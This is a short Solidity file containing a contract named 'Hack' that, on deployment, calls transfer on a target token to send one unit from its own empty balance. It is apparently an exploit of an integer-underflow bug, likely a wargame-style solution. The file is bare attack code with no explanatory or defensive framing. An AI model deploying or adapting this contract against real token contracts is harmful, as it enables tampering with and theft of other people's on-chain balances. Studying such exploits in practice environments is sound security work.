pragma solidity ^0.8;

interface IToken {
    function balanceOf(address) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}